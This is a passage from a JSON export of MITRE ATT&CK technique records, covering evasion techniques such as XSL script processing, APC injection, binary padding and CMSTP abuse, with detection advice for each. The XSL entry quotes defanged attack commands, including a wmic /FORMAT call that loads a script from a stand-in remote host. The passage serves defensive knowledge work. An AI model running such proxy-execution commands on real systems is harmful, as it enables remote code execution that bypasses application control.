cookie into a browser they control and is able to use the site or application as the user for as long as the session cookie is active. Once logged into the site, an adversary can access sensitive information, read email, or perform actions that the victim account has permissions to perform.<\/p>\n<p>There have been examples of malware targeting session cookies to bypass multi-factor authentication systems.(Citation: Unit 42 Mac Crypto Cookies January 2019) <\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":4,"name":"Office 365","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":409,"platform_id":4,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":9,"name":"SaaS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":409,"platform_id":9,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":416,"name":"T1220 - XSL Script Processing","sort_id":0,"external_id":"T1220","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. (Citation: Microsoft XSLT Script Mar 2017)<\/p>\n<p>Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to <a href=\"https:\/\/attack.mitre.org\/techniques\/T1127\">Trusted Developer Utilities Proxy Execution<\/a>, the Microsoft common line transformation utility binary (msxsl.exe) (Citation: Microsoft msxsl.exe) can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. (Citation: Penetration Testing Lab MSXSL July 2017) Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. (Citation: Reaqta MSXSL Spearphishing MAR 2018) Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML\/XSL files an arbitrary file extension.(Citation: XSL Bypass Mar 2019)<\/p>\n<p>Command-line examples:(Citation: Penetration Testing Lab MSXSL July 2017)(Citation: XSL Bypass Mar 2019)<\/p>\n<ul>\n<li><code>msxsl.exe customers[.]xml script[.]xsl<\/code><\/li>\n<li><code>msxsl.exe script[.]xsl script[.]xsl<\/code><\/li>\n<li><code>msxsl.exe script[.]jpeg script[.]jpeg<\/code><\/li>\n<\/ul>\n<p>Another variation of this technique, dubbed \u201cSquiblytwo\u201d, involves using <a href=\"https:\/\/attack.mitre.org\/techniques\/T1047\">Windows Management Instrumentation<\/a> to invoke JScript or VBScript within an XSL file.(Citation: LOLBAS Wmic) This technique can also execute local\/remote scripts and, similar to its <a href=\"https:\/\/attack.mitre.org\/techniques\/T1117\">Regsvr32<\/a>\/ &quot;Squiblydoo&quot; counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in <a href=\"https:\/\/attack.mitre.org\/techniques\/T1047\">Windows Management Instrumentation<\/a> provided they utilize the \/FORMAT switch.(Citation: XSL Bypass Mar 2019)<\/p>\n<p>Command-line examples:(Citation: XSL Bypass Mar 2019)(Citation: LOLBAS Wmic)<\/p>\n<ul>\n<li>Local File: <code>wmic process list \/FORMAT:evil[.]xsl<\/code><\/li>\n<li>Remote File: <code>wmic os get \/FORMAT:\u201dhttps[:]\/\/example[.]com\/evil[.]xsl\u201d<\/code><\/li>\n<\/ul>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Use process monitoring to monitor the execution and arguments of msxsl.exe and wmic.exe. Compare recent invocations of these utilities with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity (ex: URL command line arguments, creation of external network connections, loading of DLLs associated with scripting). (Citation: LOLBAS Wmic) (Citation: Twitter SquiblyTwo Detection APR 2018) Command arguments used before and after the script invocation may also be useful in determining the origin and purpose of the payload being loaded.\n\nThe presence of msxsl.exe or other utilities that enable proxy execution that are typically used for development, debugging, and reverse engineering on a system that is not used for these purposes may be suspicious.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":416,"platform_id":3,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":427,"name":"T1418 - Application Discovery","sort_id":0,"external_id":"T1418","external_sub_id":null,"old_external_id":"MOB-T1021","old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may seek to identify all applications installed on the device. One use case for doing so is to identify the presence of endpoint security applications that may increase the adversary's risk of detection. Another use case is to identify the presence of applications that the adversary may wish to target.<\/p>\n<p>On Android, applications can use methods in the PackageManager class (Citation: Android-PackageManager) to enumerate other apps installed on device, or an entity with shell access can use the pm command line tool.<\/p>\n<p>On iOS, apps can use private API calls to obtain a list of other apps installed on the device. (Citation: Kurtz-MaliciousiOSApps) However, use of private API calls will likely prevent the application from being distributed through Apple's App Store.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":10,"name":"Android","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":427,"platform_id":10,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}},{"id":11,"name":"iOS","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":427,"platform_id":11,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}}]},{"id":442,"name":"T1408 - Disguise Root\/Jailbreak Indicators","sort_id":0,"external_id":"T1408","external_sub_id":null,"old_external_id":"MOB-T1011","old_external_sub_id":null,"tactic_id":19,"description":"<p>An adversary could use knowledge of the techniques used by security software to evade detection(Citation: Brodie)(Citation: Tan). For example, some mobile security products perform compromised device detection by searching for particular artifacts such as an installed &quot;su&quot; binary, but that check could be evaded by naming the binary something else. Similarly, polymorphic code techniques could be used to evade signature-based detection(Citation: Rastogi).<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":10,"name":"Android","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":442,"platform_id":10,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}},{"id":11,"name":"iOS","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":442,"platform_id":11,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}}]},{"id":445,"name":"T1407 - Download New Code at Runtime","sort_id":0,"external_id":"T1407","external_sub_id":null,"old_external_id":"MOB-T1010","old_external_sub_id":null,"tactic_id":19,"description":"<p>An app could download and execute dynamic code (not included in the original application package) after installation to evade static analysis techniques (and potentially dynamic analysis techniques) used for application vetting or application store review.(Citation: Poeplau-ExecuteThis)<\/p>\n<p>On Android, dynamic code could include native code, Dalvik code, or JavaScript code that uses the Android WebView's JavascriptInterface capability.(Citation: Bromium-AndroidRCE)<\/p>\n<p>On iOS, techniques also exist for executing dynamic code downloaded after application installation.(Citation: FireEye-JSPatch)(Citation: Wang)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:03","updated_at":"2020-07-28 16:02:21","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Downloading new code at runtime can be difficult to detect, and therefore enterprises may be better served focusing on detection at other stages of adversary behavior.","platforms":[{"id":10,"name":"Android","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":445,"platform_id":10,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}},{"id":11,"name":"iOS","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":445,"platform_id":11,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}}]},{"id":448,"name":"T1523 - Evade Analysis Environment","sort_id":0,"external_id":"T1523","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Malicious applications may attempt to detect their operating environment prior to fully executing their payloads. These checks are often used to ensure the application is not running within an analysis environment such as a sandbox used for application vetting, security research, or reverse engineering.\nAdversaries may use many different checks such as physical sensors, location, and system properties to fingerprint emulators and sandbox environments.(Citation: Talos Gustuff Apr 2019)(Citation: ThreatFabric Cerberus)(Citation: Xiao-ZergHelper)(Citation: Cyberscoop Evade Analysis January 2019) Adversaries may access <code>android.os.SystemProperties<\/code> via Java reflection to obtain specific system information.(Citation: Github Anti-emulator) Standard values such as phone number, IMEI, IMSI, device IDs, and device drivers may be checked against default signatures of common sandboxes.(Citation: Sophos Anti-emulation)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:03","updated_at":"2020-07-28 16:02:21","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Analysis Environment avoidance capabilities can be difficult to detect, and therefore enterprises may be better served focusing on detection at other stages of adversarial behavior.","platforms":[{"id":10,"name":"Android","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":448,"platform_id":10,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}},{"id":11,"name":"iOS","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":448,"platform_id":11,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}}]},{"id":459,"name":"T1516 - Input Injection","sort_id":0,"external_id":"T1516","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>A malicious application can inject input to the user interface to mimic user interaction through the abuse of Android's accessibility APIs.<\/p>\n<p><a href=\"https:\/\/attack.mitre.org\/techniques\/T1516\">Input Injection<\/a> can be achieved using any of the following methods:<\/p>\n<ul>\n<li>Mimicking user clicks on the screen, for example to steal money from a user's PayPal account.(Citation: android-trojan-steals-paypal-2fa)<\/li>\n<li>Injecting global actions, such as <code>GLOBAL_ACTION_BACK<\/code> (programatically mimicking a physical back button press), to trigger actions on behalf of the user.(Citation: Talos Gustuff Apr 2019)<\/li>\n<li>Inserting input into text fields on behalf of the user. This method is used legitimately to auto-fill text fields by applications such as password managers.(Citation: bitwarden autofill logins)<\/li>\n<\/ul>","is_deprecated":false,"created_at":"2020-06-26 11:56:03","updated_at":"2020-07-28 16:02:21","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Users can view applications that have registered accessibility services in the accessibility menu within the device settings.","platforms":[{"id":10,"name":"Android","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":459,"platform_id":10,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}}]},{"id":461,"name":"T1478 - Install Insecure or Malicious Configuration","sort_id":0,"external_id":"T1478","external_sub_id":null,"old_external_id":"MOB-T1081","old_external_sub_id":null,"tactic_id":19,"description":"<p>An adversary could attempt to install insecure or malicious configuration settings on the mobile device, through means such as phishing emails or text messages either directly containing the configuration settings as an attachment, or containing a web link to the configuration settings. The device user may be tricked into installing the configuration settings through social engineering techniques (Citation: Symantec-iOSProfile).<\/p>\n<p>For example, an unwanted Certification Authority (CA) certificate could be placed in the device's trusted certificate store, increasing the device's susceptibility to man-in-the-middle network attacks seeking to eavesdrop on or manipulate the device's network communication (<a href=\"https:\/\/attack.mitre.org\/techniques\/T1439\">Eavesdrop on Insecure Network Communication<\/a> and <a href=\"https:\/\/attack.mitre.org\/techniques\/T1463\">Manipulate Device Communication<\/a>).<\/p>\n<p>On iOS, malicious Configuration Profiles could contain unwanted Certification Authority (CA) certificates or other insecure settings such as unwanted proxy server or VPN settings to route the device's network traffic through an adversary's system. The device could also potentially be enrolled into a malicious Mobile Device Management (MDM) system (Citation: Talos-MDM).<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:03","updated_at":"2020-07-28 16:02:21","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"On Android, the user can view trusted CA certificates through the device settings and look for unexpected certificates. A mobile security product could similarly examine the trusted CA certificate store for anomalies.\n\nOn iOS, the user can view installed Configuration Profiles through the device settings and look for unexpected profiles. A Mobile Device Management (MDM) system could use the iOS MDM APIs to examine the list of installed Configuration Profiles for anomalies.","platforms":[{"id":10,"name":"Android","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":461,"platform_id":10,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}},{"id":11,"name":"iOS","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":461,"platform_id":11,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}}]},{"id":469,"name":"T1398 - Modify OS Kernel or Boot Partition","sort_id":0,"external_id":"T1398","external_sub_id":null,"old_external_id":"MOB-T1001","old_external_sub_id":null,"tactic_id":19,"description":"<p>If an adversary can escalate privileges, he or she may be able to use those privileges to place malicious code in the device kernel or other boot partition components, where the code may evade detection, may persist after device resets, and may not be removable by the device user. In some cases (e.g., the Samsung Knox warranty bit as described under Detection), the attack may be detected but could result in the device being placed in a state that no longer allows certain functionality.<\/p>\n<p>Many Android devices provide the ability to unlock the bootloader for development purposes, but doing so introduces the potential ability for others to maliciously update the kernel or other boot partition code.<\/p>\n<p>If the bootloader is not unlocked, it may still be possible to exploit device vulnerabilities to update the code.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:03","updated_at":"2020-07-28 16:02:21","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"The Android SafetyNet API's remote attestation capability could potentially be used to identify and respond to compromised devices. Samsung KNOX also provides a remote attestation capability on supported Samsung Android devices.\n\nSamsung KNOX devices include a non-reversible Knox warranty bit fuse that is triggered \"if a non-Knox kernel has been loaded on the device\" (Citation: Samsung-KnoxWarrantyBit). If triggered, enterprise Knox container services will no longer be available on the device.\n\nAs described in the iOS Security Guide (Citation: Apple-iOSSecurityGuide), iOS devices will fail to boot or fail to allow device activation if unauthorized modifications are detected.\n\nMany enterprise applications perform their own checks to detect and respond to compromised devices. These checks are not foolproof but can detect common signs of compromise.","platforms":[{"id":10,"name":"Android","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":469,"platform_id":10,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}},{"id":11,"name":"iOS","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":469,"platform_id":11,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}}]},{"id":470,"name":"T1400 - Modify System Partition","sort_id":0,"external_id":"T1400","external_sub_id":null,"old_external_id":"MOB-T1003","old_external_sub_id":null,"tactic_id":19,"description":"<p>If an adversary can escalate privileges, he or she may be able to use those privileges to place malicious code in the device system partition, where it may persist after device resets and may not be easily removed by the device user.<\/p>\n<p>Many Android devices provide the ability to unlock the bootloader for development purposes. An unlocked bootloader may provide the ability for an adversary to modify the system partition. Even if the bootloader is locked, it may be possible for an adversary to escalate privileges and then modify the system partition.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:03","updated_at":"2020-07-28 16:02:21","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Android devices with the Verified Boot capability (Citation: Android-VerifiedBoot) perform cryptographic checks of the integrity of the system partition.\n\nThe Android SafetyNet API's remote attestation capability could potentially be used to identify and respond to compromised devices.\n\nSamsung KNOX also provides a remote attestation capability on supported Samsung Android devices.\n\niOS devices will fail to boot or fail to allow device activation if unauthorized modifications are detected.(Citation: Apple-iOSSecurityGuide)","platforms":[{"id":10,"name":"Android","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":470,"platform_id":10,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}},{"id":11,"name":"iOS","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":470,"platform_id":11,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}}]},{"id":471,"name":"T1399 - Modify Trusted Execution Environment","sort_id":0,"external_id":"T1399","external_sub_id":null,"old_external_id":"MOB-T1002","old_external_sub_id":null,"tactic_id":19,"description":"<p>If an adversary can escalate privileges, he or she may be able to use those privileges to place malicious code in the device's Trusted Execution Environment (TEE) or other similar isolated execution environment where the code can evade detection, may persist after device resets, and may not be removable by the device user. Running code within the TEE may provide an adversary with the ability to monitor or tamper with overall device behavior.(Citation: Roth-Rootkits)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:03","updated_at":"2020-07-28 16:02:21","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Devices may perform cryptographic integrity checks of code running within the TEE at boot time.\n\niOS devices will fail to boot if the software running within the Secure Enclave does not pass signature verification.(Citation: Apple-iOSSecurityGuide)","platforms":[{"id":10,"name":"Android","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":471,"platform_id":10,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}}]},{"id":475,"name":"T1406 - Obfuscated Files or Information","sort_id":0,"external_id":"T1406","external_sub_id":null,"old_external_id":"MOB-T1009","old_external_sub_id":null,"tactic_id":19,"description":"<p>An app could contain malicious code in obfuscated or encrypted form, then deobfuscate or decrypt the code at runtime to evade many app vetting techniques.(Citation: Rastogi) (Citation: Zhou) (Citation: TrendMicro-Obad) (Citation: Xiao-iOS)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:03","updated_at":"2020-07-28 16:02:21","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Malicious obfuscation of files or information can be difficult to detect, and therefore enterprises may be better served focusing on detection at other stages of adversary behavior.","platforms":[{"id":10,"name":"Android","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":475,"platform_id":10,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}},{"id":11,"name":"iOS","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":475,"platform_id":11,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}}]},{"id":488,"name":"T1508 - Suppress Application Icon","sort_id":0,"external_id":"T1508","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>A malicious application could suppress its icon from being displayed to the user in the application launcher to hide the fact that it is installed, and to make it more difficult for the user to uninstall the application. Hiding the application's icon programmatically does not require any special permissions.<\/p>\n<p>This behavior has been seen in the BankBot\/Spy Banker family of malware.(Citation: android-trojan-steals-paypal-2fa)(Citation: sunny-stolen-credentials)(Citation: bankbot-spybanker)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:03","updated_at":"2020-07-28 16:02:21","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"The user can examine the list of all installed applications, including those with a suppressed icon, in the device settings.","platforms":[{"id":10,"name":"Android","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":488,"platform_id":10,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}}]},{"id":505,"name":"T1550.001 - Application Access Token","sort_id":0,"external_id":"T1550.001","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may use stolen application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users and used in lieu of login credentials.<\/p>\n<p>Application access tokens are used to make authorized API requests on behalf of a user and are commonly used as a way to access resources in cloud-based applications and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019) OAuth is one commonly implemented framework that issues tokens to users for access to systems. These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform. Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user. Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application.(Citation: okta)<\/p>\n<p>For example, with a cloud-based email service once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a &quot;refresh&quot; token enabling background access is awarded.(Citation: Microsoft Identity Platform Access 2019) With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration.(Citation: Staaldraad Phishing with OAuth 2017)<\/p>\n<p>Compromised access tokens may be used as an initial step in compromising other services. For example, if a token grants access to a victim\u2019s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines. Direct API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords. Access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor access token activity for abnormal use and permissions granted to unusual or suspicious applications and APIs.","platforms":[{"id":4,"name":"Office 365","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":505,"platform_id":4,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":9,"name":"SaaS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":505,"platform_id":9,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":514,"name":"T1055.004 - Asynchronous Procedure Call","sort_id":0,"external_id":"T1055.004","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may inject malicious code into processes via the asynchronous procedure call (APC) queue in order to evade process-based defenses as well as possibly elevate privileges. APC injection is a method of executing arbitrary code in the address space of a separate live process. <\/p>\n<p>APC injection is commonly performed by attaching malicious code to the APC Queue (Citation: Microsoft APC) of a process's thread. Queued APC functions are executed when the thread enters an alterable state.(Citation: Microsoft APC) A handle to an existing victim process is first created with native Windows API calls such as <code>OpenThread<\/code>. At this point <code>QueueUserAPC<\/code> can be used to invoke a function (such as <code>LoadLibrayA<\/code> pointing to a malicious DLL). <\/p>\n<p>A variation of APC injection, dubbed &quot;Early Bird injection&quot;, involves creating a suspended process in which malicious code can be written and executed before the process' entry point (and potentially subsequent anti-malware hooks) via an APC. (Citation: CyberBit Early Bird Apr 2018) AtomBombing (Citation: ENSIL AtomBombing Oct 2016) is another variation that utilizes APCs to invoke malicious code previously written to the global atom table.(Citation: Microsoft Atom Table)<\/p>\n<p>Running code in the context of another process may allow access to the process's memory, system\/network resources, and possibly elevated privileges. Execution via APC injection may also evade detection from security products since the execution is masked under a legitimate process. <\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>SuspendThread<\/code>\/<code>SetThreadContext<\/code>\/<code>ResumeThread<\/code>, <code>QueueUserAPC<\/code>\/<code>NtQueueApcThread<\/code>, and those that can be used to modify memory within another process, such as <code>VirtualAllocEx<\/code>\/<code>WriteProcessMemory<\/code>, may be used for this technique.(Citation: Endgame Process Injection July 2017)\n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. ","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":514,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":520,"name":"T1027.001 - Binary Padding","sort_id":0,"external_id":"T1027.001","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may use binary padding to add junk data and change the on-disk representation of malware. This can be done without affecting the functionality or behavior of a binary, but can increase the size of the binary beyond what some security tools are capable of handling due to file size limitations. <\/p>\n<p>Binary padding effectively changes the checksum of the file and can also be used to avoid hash-based blocklists and static anti-virus signatures.(Citation: ESET OceanLotus) The padding used is commonly generated by a function to create junk data and then appended to the end or applied to sections of malware.(Citation: Securelist Malware Tricks April 2017) Increasing the file size may decrease the effectiveness of certain tools and detection capabilities that are not designed or configured to scan large files. This may also reduce the likelihood of being collected for analysis. Public file scanning services, such as VirusTotal, limits the maximum size of an uploaded file to be analyzed.(Citation: VirusTotal FAQ) <\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Depending on the method used to pad files, a file-based signature may be capable of detecting padding using a scanning or on-access based tool.  When executed, the resulting process from padded files may also exhibit other behavior characteristics of being used to conduct an intrusion such as system and network information Discovery or Lateral Movement, which could be used as event indicators that point to the source file. ","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":520,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":520,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":520,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":524,"name":"T1218.003 - CMSTP","sort_id":0,"external_id":"T1218.003","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may abuse CMSTP to proxy execution of malicious code. The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles. (Citation: Microsoft Connection Manager Oct 2009) CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.<\/p>\n<p>Adversaries may supply CMSTP.exe with INF files infected with malicious commands. (Citation: Twitter CMSTP Usage Jan 2018) Similar to <a href=\"https:\/\/attack.mitre.org\/techniques\/T1218\/010\">Regsvr32<\/a> \/ \u201dSquiblydoo\u201d, CMSTP.exe may be abused to load and execute DLLs (Citation: MSitPros CMSTP Aug 2017)  and\/or COM scriptlets (SCT) from remote servers. (Citation: Twitter CMSTP Jan 2018) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018) This execution may also bypass AppLocker and other application control defenses since CMSTP.exe is a legitimate, signed Microsoft application.<\/p>\n<p>CMSTP.exe can also be abused to <a href=\"https:\/\/attack.mitre.org\/techniques\/T1548\/002\">Bypass User Access Control<\/a> and execute arbitrary commands from a malicious INF through an auto-elevated COM interface. (Citation: MSitPros CMSTP Aug 2017) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Use process monitoring to detect and analyze the execution and arguments of CMSTP.exe. Compare recent invocations of CMSTP.exe with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity.\n\nSysmon events can also be used to identify potential abuses of CMSTP.exe. Detection strategy may depend on the specific adversary procedure, but potential rules include: (Citation: Endurant CMSTP July 2018)\n\n* To detect loading and execution of local\/remote payloads - Event 1 (Process creation) where ParentImage contains CMSTP.exe and\/or Event 3 (Network connection) where Image contains CMSTP.exe and DestinationIP is external.\n* To detect [Bypass User Access Control](https:\/\/attack.mitre.org\/techniques\/T1548\/002) via an auto-elevated COM interface - Event 10 (ProcessAccess) where CallTrace contains CMLUA.dll and\/or Event 12 or 13 (RegistryEvent) where TargetObject contains CMMGR32.exe. Also monitor for events, such as the creation of processes (Sysmon Event 1), that involve auto-elevated CMSTP COM interfaces such as CMSTPLUA 